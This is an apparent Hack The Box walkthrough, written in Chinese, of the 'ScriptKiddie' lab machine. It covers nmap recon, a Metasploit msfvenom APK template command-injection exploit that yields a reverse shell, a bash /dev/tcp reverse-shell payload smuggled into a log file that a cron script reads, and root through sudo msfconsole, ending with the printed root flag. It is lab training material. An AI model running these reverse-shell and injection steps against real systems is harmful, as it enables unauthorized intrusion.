靶机 10.10.10.226

kali 10.10.16.5

[Hackthebox-ScriptKiddie靶机实战 - herbmint - 博客园 (cnblogs.com)](https://www.cnblogs.com/herbmint/p/15956043.html)

[【Hack The Box】ScriptKiddie - 家studyをつづって](https://www.iestudy.work/entry/2022/08/14/143847)

[HTB: ScriptKiddie | 0xdf hacks stuff](https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html#shell-1)



```bash
└─# nmap -sV -sC -O 10.10.10.226 -p22,5000 -oN nmap.txt

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c656bc2dfb99d627427a7b8a9d3252c (RSA)
|   256 b9a1785d3c1b25e03cef678d71d3a3ec (ECDSA)
|_  256 8bcf4182c6acef9180377cc94511e843 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 4.15 - 5.6 (93%), Linux 5.4 (93%), Android 4.1.1 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```



# 5000 web

<img src=".\图片\Snipaste_2023-09-25_10-55-06.png" alt="Snipaste_2023-09-25_10-55-06" style="zoom:80%;" />



三个功能点，均尝试了命令注入，但是被拦截了

还是老样子，搜索 nmap 或者 msfvenom 的版本有无已知漏洞



```bash
└─# searchsploit msfvenom 
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection                                                           | multiple/local/49491.py
```

报错 [command-not-found.com – jarsigner (command-not-found.com)](https://command-not-found.com/jarsigner)



好像网站上的 msfvenom 也有 生成 APK 的功能



那就 msf 来打 msf

```bash
msf6 > search msfvenom

Matching Modules
================

   #  Name                                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                                    ---------------  ----       -----  -----------
   0  exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection  2020-10-29       excellent  No     Rapid7 Metasploit Framework msfvenom APK Template Command Injection
```



```bash
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set payload 40
payload => cmd/unix/reverse_bash
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run
```



再把 apk 上传到 web 页面



```bash
┌──(root💀kali)-[~/ScriptKiddie]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.226] 50586
id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
```

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
kid@scriptkiddie:~/html$ 
```



# 提权

```bash
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh
cat scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

```bash
kid@scriptkiddie:/home/pwn$ ls -al
ls -al
total 44
drwxr-xr-x 6 pwn  pwn  4096 Feb  3  2021 .
drwxr-xr-x 4 root root 4096 Feb  3  2021 ..
lrwxrwxrwx 1 root root    9 Feb  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 pwn  pwn   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 pwn  pwn  3771 Feb 25  2020 .bashrc
drwx------ 2 pwn  pwn  4096 Jan 28  2021 .cache
drwxrwxr-x 3 pwn  pwn  4096 Jan 28  2021 .local
-rw-r--r-- 1 pwn  pwn   807 Feb 25  2020 .profile
-rw-rw-r-- 1 pwn  pwn    74 Jan 28  2021 .selected_editor
drwx------ 2 pwn  pwn  4096 Feb 10  2021 .ssh
drwxrw---- 2 pwn  pwn  4096 Sep 25 03:00 recon
-rwxrwxr-- 1 pwn  pwn   250 Jan 28  2021 scanlosers.sh
```



看脚本 scanlosers.sh，如果我们可以修改 /home/kid/logs/hackers 里的内容，就可以达到命令注入

```bash
kid@scriptkiddie:/home/pwn$ ls -al /home/kid/logs/hackers
ls -al /home/kid/logs/hackers
-rw-rw-r-- 1 kid pwn 0 Sep 25 02:41 /home/kid/logs/hackers
```

```bash
echo 'a b $(bash -c "bash -i &>/dev/tcp/10.10.16.5/6666 0>&1")' > /home/kid/logs/hackers
```



监听得到 shell

```bash
└─# nc -lvnp 6666                                      
listening on [any] 6666 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.226] 55638
bash: cannot set terminal process group (888): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ 
```



```bash
pwn@scriptkiddie:~$ whoami
whoami
pwn
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```



sudo msf 得到 root

```bash
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole
sudo /opt/metasploit-framework-6.0.9/msfconsole
                                                  
                                   ____________
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
 [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
 [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
 [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]


       =[ metasploit v6.0.9-dev                           ]
+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Metasploit can be configured at startup, see msfconsole --help to learn more

stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
msf6 > /bin/bash
stty: 'standard input': Inappropriate ioctl for device
[*] exec: /bin/bash

whoami
root
cat /root/roo.^H
cat: '/root/roo.'$'\b': No such file or directory
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@scriptkiddie:/home/pwn# cat /root/root.txt
cat /root/root.txt
f50f69f0494ff0f04a2e212fdd7f6396
```




